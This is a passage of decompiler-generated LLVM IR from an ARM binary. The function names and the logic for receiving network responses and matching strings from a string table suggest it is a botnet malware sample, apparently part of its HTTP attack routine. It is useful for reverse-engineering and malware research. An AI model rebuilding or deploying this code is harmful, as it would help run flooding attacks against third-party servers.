  %v1_951c = add i32 %v0_951c, 16
  %v2_951c = inttoptr i32 %v1_951c to i32*
  %v3_951c = load i32, i32* %v2_951c, align 4
  %v1_9520 = and i32 %v3_951c, 33554432
  %v2_9520 = icmp ne i32 %v1_9520, 0
  store i1 %v2_9520, i1* %cpsr_c.global-to-local, align 1
  %v3_9520 = mul i32 %v3_951c, 128
  %v1_9524 = add i32 %v3_9520, 1472
  %v0_9528 = load i32, i32* @r5, align 4
  store i32 %v0_9528, i32* %r1.global-to-local, align 4
  %v0_952c = load i32, i32* %sb.global-to-local, align 4
  %v2_952c = add i32 %v1_9524, %v0_952c
  store i32 %v2_952c, i32* @r0, align 4
  %v2_9530 = inttoptr i32 %v2_952c to i8*
  %v3_9530 = call i32 @util_strcpy(i8* %v2_9530, i32 %v0_9528)
  store i32 %v3_9530, i32* %r0.global-to-local, align 4
  %v0_9534 = load i32, i32* @sl, align 4
  %v1_9534 = add i32 %v0_9534, 16
  %v2_9534 = inttoptr i32 %v1_9534 to i32*
  %v3_9534 = load i32, i32* %v2_9534, align 4
  %v0_9538 = load i32, i32* @r8, align 4
  store i32 %v0_9538, i32* @r5, align 4
  %v1_953c = add i32 %v3_9534, 1
  store i32 %v1_953c, i32* %r3.global-to-local, align 4
  store i32 %v1_953c, i32* %v2_9534, align 4
  %v1_935c.pre.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_9350

dec_label_pc_9548:                                ; preds = %dec_label_pc_9668
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_954c = load i32, i32* @r4, align 4
  %v2_954c = inttoptr i32 %v1_954c to i32*
  store i32 104, i32* %v2_954c, align 4
  br label %dec_label_pc_9550

dec_label_pc_9550:                                ; preds = %dec_label_pc_9694, %dec_label_pc_9028, %dec_label_pc_9548
  %v0_9550 = load i32, i32* @sl, align 4
  %v1_9550 = add i32 %v0_9550, -1452
  %v2_9550 = inttoptr i32 %v1_9550 to i32*
  %v3_9550 = load i32, i32* %v2_9550, align 4
  store i32 %v3_9550, i32* %r0.global-to-local, align 4
  %v1_9554 = call i32 @__GI___libc_close(i32 %v3_9550)
  store i32 %v1_9554, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_9560 = load i32, i32* @sl, align 4
  %v2_9560 = add i32 %v1_9560, -1452
  %v3_9560 = inttoptr i32 %v2_9560 to i32*
  store i32 -1, i32* %v3_9560, align 4
  %v0_9564 = load i32, i32* %r2.global-to-local, align 4
  %v1_9564 = trunc i32 %v0_9564 to i8
  %v2_9564 = load i32, i32* @sl, align 4
  %v3_9564 = add i32 %v2_9564, -1448
  %v4_9564 = inttoptr i32 %v3_9564 to i8*
  store i8 %v1_9564, i8* %v4_9564, align 1
  br label %dec_label_pc_87ec

dec_label_pc_956c:                                ; preds = %dec_label_pc_85d4
  store i32 %v1_85d4, i32* %r3.global-to-local, align 4
  %v1_9570 = trunc i32 %v1_85d4 to i8
  store i8 %v1_9570, i8* %v2_860c, align 1
  %v0_9574 = load i32, i32* @r6, align 4
  %v1_9574 = add i32 %v0_9574, -1452
  %v2_9574 = inttoptr i32 %v1_9574 to i32*
  %v3_9574 = load i32, i32* %v2_9574, align 4
  store i32 %v3_9574, i32* %r0.global-to-local, align 4
  %v1_9578 = call i32 @__GI___libc_close(i32 %v3_9574)
  store i32 %v1_9578, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_9580 = load i32, i32* @r6, align 4
  %v2_9580 = add i32 %v1_9580, -1452
  %v3_9580 = inttoptr i32 %v2_9580 to i32*
  store i32 -1, i32* %v3_9580, align 4
  br label %dec_label_pc_85f4

dec_label_pc_9588:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9350
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_9590 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_9594 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9594, i32* @r1, align 4
  store i32 %v3_9590, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95a0 = call i32 @util_stristr(i8* %tmp169, i32 %v0_9594, i32 %v3_9590)
  store i32 %v4_95a0, i32* %r0.global-to-local, align 4
  %v2_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v2_95a4, i1* %cpsr_c.global-to-local, align 1
  %v7_95a4 = icmp eq i32 %v4_95a0, -1
  store i1 %v7_95a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95a4, label %dec_label_pc_9718, label %dec_label_pc_95ac

dec_label_pc_95ac:                                ; preds = %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 45, i32* %r0.global-to-local, align 4
  %v3_95b4 = call i32 @table_retrieve_val(i32 45, i32* null)
  %v0_95b8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_95b8, i32* @r1, align 4
  store i32 %v3_95b4, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_95c4 = call i32 @util_stristr(i8* %tmp169, i32 %v0_95b8, i32 %v3_95b4)
  store i32 %v4_95c4, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_95cc = add i32 %v4_95c4, %v2_827c
  %v3_95cc = inttoptr i32 %v2_95cc to i8*
  %v4_95cc = load i8, i8* %v3_95cc, align 1
  %v2_95d4 = icmp ugt i8 %v4_95cc, 31
  store i1 %v2_95d4, i1* %cpsr_c.global-to-local, align 1
  %v7_95d4 = icmp eq i8 %v4_95cc, 32
  store i1 %v7_95d4, i1* %cpsr_z.global-to-local, align 1
  %v2_95dc = zext i1 %v7_95d4 to i32
  %v2_95dc.v4_95c4 = add i32 %v2_95dc, %v4_95c4
  store i32 %v2_95dc.v4_95c4, i32* @r4, align 4
  %v2_95e0 = add i32 %v2_95dc.v4_95c4, %v2_827c
  store i32 %v2_95e0, i32* @r6, align 4
  store i32 %v2_95e0, i32* %r0.global-to-local, align 4
  %v1_95e8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95e8 = sub i32 %v1_95e8, %v2_95dc.v4_95c4
  store i32 %v2_95e8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95f4 = call i32 @util_memsearch(i32 %v2_95e0, i32 %v2_95e8, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_95f4, i32* %r0.global-to-local, align 4
  %v2_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v2_95f8, i1* %cpsr_c.global-to-local, align 1
  %v7_95f8 = icmp eq i32 %v5_95f4, -1
  store i1 %v7_95f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95f8, label %dec_label_pc_9718, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %dec_label_pc_95ac
  %v2_9600 = icmp ne i32 %v5_95f4, 0
  store i1 %v2_9600, i1* %cpsr_c.global-to-local, align 1
  %v7_9600 = icmp eq i32 %v5_95f4, 1
  store i1 %v7_9600, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %r2.global-to-local, align 4
  %v7_9608 = icmp slt i32 %v5_95f4, 2
  br i1 %v7_9608, label %bb202, label %bb201

bb201:                                            ; preds = %dec_label_pc_9600
  %v9_9608 = add i32 %v5_95f4, -2
  store i32 %v9_9608, i32* %r0.global-to-local, align 4
  br label %bb202

bb202:                                            ; preds = %dec_label_pc_9600, %bb201
  %v1_9610 = phi i32 [ %v5_95f4, %dec_label_pc_9600 ], [ %v9_9608, %bb201 ]
  %v2_9610 = add i32 %v1_9610, %v2_8710
  store i32 -20773, i32* @lr, align 4
  %v1_9618 = add i32 %v1_9610, 1
  store i32 %v1_9618, i32* @r5, align 4
  %v1_961c = load i32, i32* @r4, align 4
  %v2_961c = add i32 %v2_9610, %v1_961c
  store i32 %v2_961c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_9624 = load i32, i32* @r6, align 4
  store i32 %v0_9624, i32* %r0.global-to-local, align 4
  store i32 %v1_9618, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1a79c.54 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_9634 = add i32 %v2_961c, -20773
  %v5_9634 = inttoptr i32 %v4_9634 to i8*
  store i8 0, i8* %v5_9634, align 1
  %v5_9638 = call i32 @util_memsearch(i32 %v0_9624, i32 %v1_9618, i32 ptrtoint ([5 x i8]* @global_var_1a79c.54 to i32), i32 4)
  store i32 %v5_9638, i32* %r0.global-to-local, align 4
  %v2_963c = icmp ugt i32 %v5_9638, 3
  store i1 %v2_963c, i1* %cpsr_c.global-to-local, align 1
  %v7_963c = icmp eq i32 %v5_9638, 4
  store i1 %v7_963c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_963c, label %dec_label_pc_9a00, label %dec_label_pc_9644

dec_label_pc_9644:                                ; preds = %bb202
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_9648 = load i32, i32* @r4, align 4
  %v2_9648 = add i32 %v1_9648, %v2_827c
  %v3_9648 = inttoptr i32 %v2_9648 to i8*
  %v4_9648 = load i8, i8* %v3_9648, align 1
  %v6_9648 = zext i8 %v4_9648 to i32
  store i32 %v6_9648, i32* %r3.global-to-local, align 4
  %v2_964c = icmp ugt i8 %v4_9648, 46
  store i1 %v2_964c, i1* %cpsr_c.global-to-local, align 1
  %v7_964c = icmp eq i8 %v4_9648, 47
  store i1 %v7_964c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_964c, label %dec_label_pc_9c00, label %dec_label_pc_9654

dec_label_pc_9654:                                ; preds = %dec_label_pc_96a0, %dec_label_pc_9c30, %dec_label_pc_9c00, %dec_label_pc_9ad0, %dec_label_pc_9ab4, %dec_label_pc_9644, %dec_label_pc_9c48, %dec_label_pc_9afc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9658 = load i32, i32* @sl, align 4
  %v3_9658 = add i32 %v2_9658, -1448
  %v4_9658 = inttoptr i32 %v3_9658 to i8*
  store i8 1, i8* %v4_9658, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9660:                                ; preds = %dec_label_pc_87e4
  %v0_9660 = call i32 @__GI___errno_location()
  store i32 %v0_9660, i32* %r0.global-to-local, align 4
  store i32 %v0_9660, i32* @r4, align 4
  br label %dec_label_pc_9668

dec_label_pc_9668:                                ; preds = %dec_label_pc_968c, %dec_label_pc_9660
  %v1_966c = phi i32 [ %v0_9660, %dec_label_pc_9660 ], [ %v0_9694, %dec_label_pc_968c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_966c = inttoptr i32 %v1_966c to i32*
  store i32 0, i32* %v2_966c, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v0_9674 = load i32, i32* @sl, align 4
  %v1_9674 = add i32 %v0_9674, -1452
  %v2_9674 = inttoptr i32 %v1_9674 to i32*
  %v3_9674 = load i32, i32* %v2_9674, align 4
  store i32 %v3_9674, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_967c = load i32, i32* %r3.global-to-local, align 4
  %v1_967c = add i32 %v0_967c, 16384
  store i32 %v1_967c, i32* %r3.global-to-local, align 4
  %v4_9680 = call i32 @__libc_recv(i32 %v3_9674, i32 %v2_827c, i32 10240, i32 %v1_967c)
  store i32 %v4_9680, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9684 = icmp eq i32 %v4_9680, 0
  store i1 %v2_9684, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9684, label %dec_label_pc_9548, label %dec_label_pc_968c

dec_label_pc_968c:                                ; preds = %dec_label_pc_9668
  %v3_968c = icmp eq i32 %v4_9680, -1
  store i1 %v3_968c, i1* %cpsr_c.global-to-local, align 1
  %v8_968c = icmp eq i32 %v4_9680, -1
  store i1 %v8_968c, i1* %cpsr_z.global-to-local, align 1
  %v0_9694 = load i32, i32* @r4, align 4
  br i1 %v3_968c, label %dec_label_pc_9694, label %dec_label_pc_9668

dec_label_pc_9694:                                ; preds = %dec_label_pc_968c
  %v1_9694 = inttoptr i32 %v0_9694 to i32*
  %v2_9694 = load i32, i32* %v1_9694, align 4
  store i32 %v2_9694, i32* %r3.global-to-local, align 4
  %v2_9698 = icmp ugt i32 %v2_9694, 10
  store i1 %v2_9698, i1* %cpsr_c.global-to-local, align 1
  %v7_9698 = icmp eq i32 %v2_9694, 11
  store i1 %v7_9698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9698, label %dec_label_pc_96a0, label %dec_label_pc_9550

dec_label_pc_96a0:                                ; preds = %dec_label_pc_9694
  %v0_96a0 = load i32, i32* @sl, align 4
  %v1_96a0 = add i32 %v0_96a0, -1448
  %v2_96a0 = inttoptr i32 %v1_96a0 to i8*
  %v3_96a0 = load i8, i8* %v2_96a0, align 1
  %v4_96a0 = zext i8 %v3_96a0 to i32
  store i32 %v4_96a0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_96a4 = icmp eq i8 %v3_96a0, 0
  store i1 %v2_96a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_96a4, label %dec_label_pc_87ec, label %dec_label_pc_9654

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8df4
  %v0_96b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_96b0 = add i32 %v0_96b0, 1
  store i32 %v1_96b0, i32* %r3.global-to-local, align 4
  %v1_96b4 = trunc i32 %v1_96b0 to i8
  %v2_96b4 = load i32, i32* @sl, align 4
  %v3_96b4 = add i32 %v2_96b4, -1448
  %v4_96b4 = inttoptr i32 %v3_96b4 to i8*
  store i8 %v1_96b4, i8* %v4_96b4, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96bc:                                ; preds = %dec_label_pc_8c6c
  %v0_96bc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96bc, i32* @r0, align 4
  %v0_96c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_96c0, i32* %r1.global-to-local, align 4
  %v2_96c4 = inttoptr i32 %v0_96bc to i8*
  %v3_96c4 = call i32 @util_strcpy(i8* %v2_96c4, i32 %v0_96c0)
  store i32 %v3_96c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c84

dec_label_pc_96cc:                                ; preds = %dec_label_pc_8d74
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_96d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_96d0 = inttoptr i32 %v1_96d0 to i32*
  store i32 104, i32* %v2_96d0, align 4
  %v0_96d4 = load i32, i32* @sl, align 4
  %v1_96d4 = add i32 %v0_96d4, -1452
  %v2_96d4 = inttoptr i32 %v1_96d4 to i32*
  %v3_96d4 = load i32, i32* %v2_96d4, align 4
  store i32 %v3_96d4, i32* %r0.global-to-local, align 4
  %v1_96d8 = call i32 @__GI___libc_close(i32 %v3_96d4)
  store i32 %v1_96d8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96e4 = load i32, i32* @sl, align 4
  %v2_96e4 = add i32 %v1_96e4, -1452
  %v3_96e4 = inttoptr i32 %v2_96e4 to i32*
  store i32 -1, i32* %v3_96e4, align 4
  %v0_96e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96e8 = trunc i32 %v0_96e8 to i8
  %v2_96e8 = load i32, i32* @sl, align 4
  %v3_96e8 = add i32 %v2_96e8, -1448
  %v4_96e8 = inttoptr i32 %v3_96e8 to i8*
  store i8 %v1_96e8, i8* %v4_96e8, align 1
  br label %dec_label_pc_87ec

dec_label_pc_96f0:                                ; preds = %dec_label_pc_8d9c
  %v0_96f0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96f0 = inttoptr i32 %v0_96f0 to i32*
  %v2_96f0 = load i32, i32* %v1_96f0, align 4
  store i32 %v2_96f0, i32* %r3.global-to-local, align 4
  %v2_96f4 = icmp ugt i32 %v2_96f0, 10
  store i1 %v2_96f4, i1* %cpsr_c.global-to-local, align 1
  %v7_96f4 = icmp eq i32 %v2_96f0, 11
  store i1 %v7_96f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96f4, label %dec_label_pc_87ec, label %dec_label_pc_96fc

dec_label_pc_96fc:                                ; preds = %dec_label_pc_96f0
  %v0_96fc = load i32, i32* @sl, align 4
  %v1_96fc = add i32 %v0_96fc, -1452
  %v2_96fc = inttoptr i32 %v1_96fc to i32*
  %v3_96fc = load i32, i32* %v2_96fc, align 4
  store i32 %v3_96fc, i32* %r0.global-to-local, align 4
  %v1_9700 = call i32 @__GI___libc_close(i32 %v3_96fc)
  store i32 %v1_9700, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_970c = load i32, i32* @sl, align 4
  %v2_970c = add i32 %v1_970c, -1452
  %v3_970c = inttoptr i32 %v2_970c to i32*
  store i32 -1, i32* %v3_970c, align 4
  %v0_9710 = load i32, i32* %r2.global-to-local, align 4
  %v1_9710 = trunc i32 %v0_9710 to i8
  %v2_9710 = load i32, i32* @sl, align 4
  %v3_9710 = add i32 %v2_9710, -1448
  %v4_9710 = inttoptr i32 %v3_9710 to i8*
  store i8 %v1_9710, i8* %v4_9710, align 1
  br label %dec_label_pc_87ec

dec_label_pc_9718:                                ; preds = %dec_label_pc_95ac, %dec_label_pc_9588
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_9720 = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9724 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9724, i32* @r1, align 4
  store i32 %v3_9720, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_9730 = call i32 @util_stristr(i8* %tmp169, i32 %v0_9724, i32 %v3_9720)
  store i32 %v4_9730, i32* %r0.global-to-local, align 4
  %v2_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v2_9738, i1* %cpsr_c.global-to-local, align 1
  %v7_9738 = icmp eq i32 %v4_9730, -1
  store i1 %v7_9738, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_9738, label %dec_label_pc_9938, label %dec_label_pc_9744

dec_label_pc_9744:                                ; preds = %dec_label_pc_9718
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r0.global-to-local, align 4
  %v3_974c = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_9750 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9750, i32* @r1, align 4
  store i32 %v3_974c, i32* %r2.global-to-local, align 4
  store i32 %v2_827c, i32* %r0.global-to-local, align 4
  %v4_975c = call i32 @util_stristr(i8* %tmp169, i32 %v0_9750, i32 %v3_974c)
  store i32 %v4_975c, i32* %r0.global-to-local, align 4
  store i32 %v2_827c, i32* @lr, align 4
  %v2_9764 = add i32 %v4_975c, %v2_827c
  %v3_9764 = inttoptr i32 %v2_9764 to i8*
  %v4_9764 = load i8, i8* %v3_9764, align 1
  %v2_976c = icmp ugt i8 %v4_9764, 31
  store i1 %v2_976c, i1* %cpsr_c.global-to-local, align 1
  %v7_976c = icmp eq i8 %v4_9764, 32
  store i1 %v7_976c, i1* %cpsr_z.global-to-local, align 1
  %v2_9774 = zext i1 %v7_976c to i32
  %v2_9774.v4_975c = add i32 %v2_9774, %v4_975c
  store i32 %v2_9774.v4_975c, i32* @r4, align 4
  %v2_9778 = add i32 %v2_9774.v4_975c, %v2_827c
  store i32 %v2_9778, i32* @r5, align 4
  store i32 %v2_9778, i32* %r0.global-to-local, align 4
  %v1_9780 = load i32, i32* %fp.global-to-local, align 4
  %v2_9780 = sub i32 %v1_9780, %v2_9774.v4_975c
  store i32 %v2_9780, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_978c = call i32 @util_memsearch(i32 %v2_9778, i32 %v2_9780, i32 ptrtoint ([3 x i8]* @global_var_1a76c.44 to i32), i32 2)
  store i32 %v5_978c, i32* %r0.global-to-local, align 4
  %v2_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v5_978c, -1
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_978c, i32* @r7, align 4
  br i1 %v7_9790, label %dec_label_pc_9938, label %dec_label_pc_979c

dec_label_pc_979c:                                ; preds = %dec_label_pc_9744
  %v2_979c = icmp ne i32 %v5_978c, 0
  store i1 %v2_979c, i1* %cpsr_c.global-to-local, align 1
  %v7_979c = icmp eq i32 %v5_978c, 1
  store i1 %v7_979c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8694, i32* %ip.global-to-local, align 4
  %v7_97a4 = icmp slt i32 %v5_978c, 2
  br i1 %v7_97a4, label %bb204, label %bb203

bb203:                                            ; preds = %dec_label_pc_979c
  %v9_97a4 = add i32 %v5_978c, -2
  store i32 %v9_97a4, i32* @r7, align 4
  br label %bb204

bb204:                                            ; preds = %dec_label_pc_979c, %bb203
  %v1_97ac = phi i32 [ %v5_978c, %dec_label_pc_979c ], [ %v9_97a4, %bb203 ]
  store i32 %v2_8710, i32* %ip.global-to-local, align 4
  %v2_97ac = add i32 %v1_97ac, %v2_8710
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_97b4 = load i32, i32* @r4, align 4
  %v2_97b4 = add i32 %v2_97ac, %v1_97b4
  store i32 %v2_97b4, i32* %r2.global-to-local, align 4
  %v3_97b8 = load i32, i32* @r6, align 4
  %v4_97b8 = add i32 %v3_97b8, %v2_97b4
  %v5_97b8 = inttoptr i32 %v4_97b8 to i8*
  store i8 0, i8* %v5_97b8, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_97c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_97c0 = inttoptr i32 %v0_97c0 to i8*
  store i8* %v5_97c0, i8** %stack_var_-44, align 4
  store i32 %v2_827c, i32* %r1.global-to-local, align 4
  %v1_97c8 = load i32, i32* @r4, align 4
  %v2_97c8 = add i32 %v1_97c8, %v2_827c
  %v3_97c8 = inttoptr i32 %v2_97c8 to i8*
  %v4_97c8 = load i8, i8* %v3_97c8, align 1
  %v6_97c8 = zext i8 %v4_97c8 to i32
  store i32 %v6_97c8, i32* %r0.global-to-local, align 4
  %v1_97cc = add nsw i32 %v6_97c8, -48
  store i32 %v1_97cc, i32* %r3.global-to-local, align 4
  %v2_97d0 = icmp ugt i32 %v1_97cc, 8
  store i1 %v2_97d0, i1* %cpsr_c.global-to-local, align 1
  %v7_97d0 = icmp eq i32 %v1_97cc, 9
  store i1 %v7_97d0, i1* %cpsr_z.global-to-local, align 1
  %v2_97d4 = xor i1 %v7_97d0, true
  %v3_97d4 = and i1 %v2_97d0, %v2_97d4
  br i1 %v3_97d4, label %.thread114, label %dec_label_pc_97dc

.thread114:                                       ; preds = %bb204
  %v4_97d4 = load i32, i32* @r5, align 4
  store i32 %v4_97d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9804

dec_label_pc_97dc:                                ; preds = %bb204
  %v1_97e8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %dec_label_pc_97e0, %dec_label_pc_97dc
  %v0_97f8 = phi i32 [ %v1_97f8, %dec_label_pc_97e0 ], [ 1, %dec_label_pc_97dc ]
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v5_97e4 = inttoptr i32 %v0_97f8 to i8*
  store i8* %v5_97e4, i8** %stack_var_-44, align 4
  %v2_97e8 = add i32 %v0_97f8, %v1_97e8.pre
  %v3_97e8 = inttoptr i32 %v2_97e8 to i8*
  %v4_97e8 = load i8, i8* %v3_97e8, align 1
  %v6_97e8 = zext i8 %v4_97e8 to i32
  store i32 %v6_97e8, i32* %r0.global-to-local, align 4
  %v1_97ec = add nsw i32 %v6_97e8, -48
  store i32 %v1_97ec, i32* %r3.global-to-local, align 4
  store i32 %v0_97f8, i32* %ip.global-to-local, align 4
  %v2_97f4 = icmp ugt i32 %v1_97ec, 8
  store i1 %v2_97f4, i1* %cpsr_c.global-to-local, align 1
  %v7_97f4 = icmp eq i32 %v1_97ec, 9
  store i1 %v7_97f4, i1* %cpsr_z.global-to-local, align 1
  %v1_97f8 = add i32 %v0_97f8, 1
  store i32 %v1_97f8, i32* @lr, align 4
  store i32 %v2_97e8, i32* %r1.global-to-local, align 4
  %v2_9800 = xor i1 %v2_97f4, true
  %v3_9800 = or i1 %v7_97f4, %v2_9800
  br i1 %v3_9800, label %dec_label_pc_97e0, label %dec_label_pc_9804

dec_label_pc_9804:                                ; preds = %dec_label_pc_97e0, %.thread114
  %v2_9810 = phi i32 [ %v4_97d4, %.thread114 ], [ %v2_97e8, %dec_label_pc_97e0 ]
  %v0_9804 = phi i32 [ %v6_97c8, %.thread114 ], [ %v6_97e8, %dec_label_pc_97e0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9804 = icmp eq i32 %v0_9804, 0
  store i1 %v2_9804, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9804, label %dec_label_pc_9938, label %dec_label_pc_980c

dec_label_pc_980c:                                ; preds = %dec_label_pc_9804
  store i32 0, i32* @r6, align 4
  %v3_9810 = inttoptr i32 %v2_9810 to i8*
  store i8 0, i8* %v3_9810, align 1
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v3_9818 = load i8*, i8** %stack_var_-44, align 4
  %v4_9818 = ptrtoint i8* %v3_9818 to i32
  %v1_981c = add i32 %v4_9818, 1
  store i32 %v1_981c, i32* %ip.global-to-local, align 4
  %v5_9820 = inttoptr i32 %v1_981c to i8*
  store i8* %v5_9820, i8** %stack_var_-44, align 4
  %v0_9824 = load i32, i32* @r5, align 4
  %v2_9824 = add i32 %v0_9824, %v1_981c
  %v3_9824 = inttoptr i32 %v2_9824 to i8*
  %v4_9824 = load i8, i8* %v3_9824, align 1
  %v6_9824 = zext i8 %v4_9824 to i32
  store i32 %v6_9824, i32* %r3.global-to-local, align 4
  %v2_9828 = icmp ugt i8 %v4_9824, 31
  store i1 %v2_9828, i1* %cpsr_c.global-to-local, align 1
  %v7_9828 = icmp eq i8 %v4_9824, 32
  store i1 %v7_9828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9828, label %bb206, label %bb205

bb205:                                            ; preds = %dec_label_pc_980c
  store i32 %v2_9824, i32* @r4, align 4
  br label %.thread38

bb206:                                            ; preds = %dec_label_pc_980c
  %v2_982c = add i32 %v4_9818, 2
  store i32 %v2_982c, i32* %ip.global-to-local, align 4
  %v2_9830 = add i32 %v0_9824, %v2_982c
  store i32 %v2_9830, i32* @r4, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 %v2_982c, i32* %v11_82f4, align 4
  %v0_983c.pre = load i32, i32* @r4, align 4
  br label %.thread38

.thread38:                                        ; preds = %bb205, %bb206
  %v0_983c = phi i32 [ %v2_9824, %bb205 ], [ %v0_983c.pre, %bb206 ]
  store i32 %v0_983c, i32* %r0.global-to-local, align 4
  %v1_9840 = inttoptr i32 %v0_983c to i8*
  %v2_9840 = call i32 @util_strlen(i8* %v1_9840)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a4.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9840, i32* @r1, align 4
  %v0_984c = load i32, i32* @r4, align 4
  store i32 %v0_984c, i32* %r0.global-to-local, align 4
  %v3_9850 = inttoptr i32 %v0_984c to i8*
  %v4_9850 = call i32 @util_stristr(i8* %v3_9850, i32 %v2_9840, i32 ptrtoint ([5 x i8]* @global_var_1a7a4.56 to i32))
  store i32 %v4_9850, i32* %r0.global-to-local, align 4
  %v2_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v2_9854, i1* %cpsr_c.global-to-local, align 1
  %v7_9854 = icmp eq i32 %v4_9850, -1
  store i1 %v7_9854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9854, label %.thread39, label %dec_label_pc_9864

.thread39:                                        ; preds = %.thread38
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v4_985c = load i32, i32* %v11_82f4, align 4
  store i32 %v4_985c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9898

dec_label_pc_9864:                                ; preds = %.thread38
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_9868 = load i8*, i8** %stack_var_-44, align 4
  %v4_9868 = ptrtoint i8* %v3_9868 to i32
  %v0_986c = load i32, i32* @r5, align 4
  %v2_986c = add i32 %v0_986c, %v4_9868
  store i32 %v2_986c, i32* @r4, align 4
  store i32 %v2_986c, i32* %r0.global-to-local, align 4
  %v1_9874 = inttoptr i32 %v2_986c to i8*
  %v2_9874 = call i32 @util_strlen(i8* %v1_9874)
  store i32 ptrtoint ([5 x i8]* @global_var_1a7a4.56 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9874, i32* @r1, align 4
  %v0_9880 = load i32, i32* @r4, align 4
  store i32 %v0_9880, i32* %r0.global-to-local, align 4
